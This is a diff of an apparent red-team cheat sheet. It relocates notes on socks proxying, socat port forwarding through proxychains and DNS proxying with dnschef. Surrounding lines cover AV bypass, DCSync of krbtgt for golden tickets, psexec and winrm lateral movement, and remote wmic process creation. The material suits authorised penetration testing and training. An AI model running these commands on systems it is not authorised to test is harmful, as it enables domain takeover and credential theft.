@@ -285,15 +285,6 @@ Cobalt
     * Note: Jon's tool Ghost works great for AV bypass (if errors then run: sudo gem install metasm)
     use post/multi/recon/local_exploit_suggester
 
-Socat port forward through proxychains
-    proxychains socat TCP4-Listen:1433,fork TCP:10.9.20.13:1433
-
-Proxy DNS
-    Install dnschef
-    sudo proxychains ./dnschef.py --nameservers 10.9.15.11 --tcp
-    vim /etc/resolv.conf (set nameserver 127.0.0.1)
-    DNS works through tcp not udp
-
 Overpass the Hash
   dcsync fqdn domain\user (User must have DCSync rights in that domain)
   dcsync fqdn domain\krbtgt (golden ticket)
@@ -313,9 +304,6 @@ Lateral Movement
     ls \\target\c$ (verify permissions)
   jump psexec, psexec64, psexec_psh, winrm, winrm64
   shell wmic.exe /node:<target> process call create "powershelle.exe whoami"
-  
-Socks Proxy Trick
-    Start CS Socks -> ssh -tt -v -L 9050:localhost:<CS Socks Port> user@10.10.10.10
   
 Kerberos Info:
     TGTDelg: Request another user's service ticket using any user account and impersonate that user
@@ -504,6 +492,18 @@ Windows Commands
     Powershell Zip Compress
       Compress-Archive -Path C:\path\file -DestinationPath C:\path\file.zip
       
+Socks Proxy Trick
+    Start CS Socks -> ssh -tt -v -L 9050:localhost:<CS Socks Port> user@10.10.10.10
+
+Socat port forward through proxychains
+    proxychains socat TCP4-Listen:1433,fork TCP:10.9.20.13:1433
+
+Proxy DNS
+    Install dnschef
+    sudo proxychains ./dnschef.py --nameservers 10.9.15.11 --tcp
+    vim /etc/resolv.conf (set nameserver 127.0.0.1)
+    DNS works through tcp not udp
+
 Windows Port Forwarding
 Port Forward
     Show Proxy: netsh interface portproxy show all
